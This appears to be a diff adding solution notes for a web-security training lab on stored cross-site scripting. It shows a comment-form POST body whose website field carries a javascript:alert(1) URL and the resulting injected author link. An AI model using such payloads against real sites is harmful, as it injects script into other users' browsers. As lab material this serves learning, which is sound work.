@@ -1,0 +1,7 @@
+This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.
+
+https://0a770016031c3d7ac134813d001b0000.web-security-academy.net/asdf.1234
+
+csrf=DW0L0VOwccRJAEzCQjdo6NRoLiwnsOCQ&postId=8&comment=cmt2&name=cm2&email=a%40a&website=javascript:alert(1)
+
+<a id="author" href="javascript:alert(1)">cmt2</a>
